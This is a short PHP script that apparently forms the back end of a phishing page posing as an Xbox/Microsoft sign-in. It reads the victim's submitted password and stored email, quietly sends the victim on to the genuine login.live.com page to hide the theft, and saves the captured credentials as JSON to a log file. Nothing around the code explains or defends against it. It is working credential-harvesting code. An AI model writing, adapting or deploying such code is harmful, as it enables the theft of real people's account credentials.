<?php
	include 'ip.php';
	session_start();
	$pass = $_POST["passwd"];
	$email=$_SESSION["Email"];
	header('Location: https://login.live.com/login.srf');
	$data = array('site' => 'Xbox',
		'user' => $email,
		'pass' => $pass);

		$json_data = json_encode($data);

		$f = fopen('../../../logs/info.txt', 'w+');
		fwrite($f, $json_data);
		fclose($f);
	exit();
	session_destroy();		
?>